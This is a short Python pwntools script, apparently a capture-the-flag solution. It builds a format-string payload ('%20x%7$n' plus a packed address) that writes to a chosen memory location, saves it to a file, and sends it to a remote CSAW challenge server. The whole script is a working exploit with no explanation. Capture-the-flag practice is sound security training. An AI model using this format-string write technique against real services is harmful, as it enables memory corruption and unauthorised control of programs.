#!/usr/bin/env python3

from pwn import *
import sys

roll_value = p64(0x6020ac)
smallpack = b'\xac\x20\x60'

payload  = b'%20x' #6
payload += b'%7$n'   #4
payload += smallpack
print(len(payload))

with open('payload.in','wb') as f:
    f.write(payload)

p = remote('pwn.red.csaw.io',5004)

print(p.recv().decode('ascii'))

print(payload)
p.sendline(payload)

print(p.recvuntil(b'," says the parrot.'))
print(p.recv().decode())

p.close()
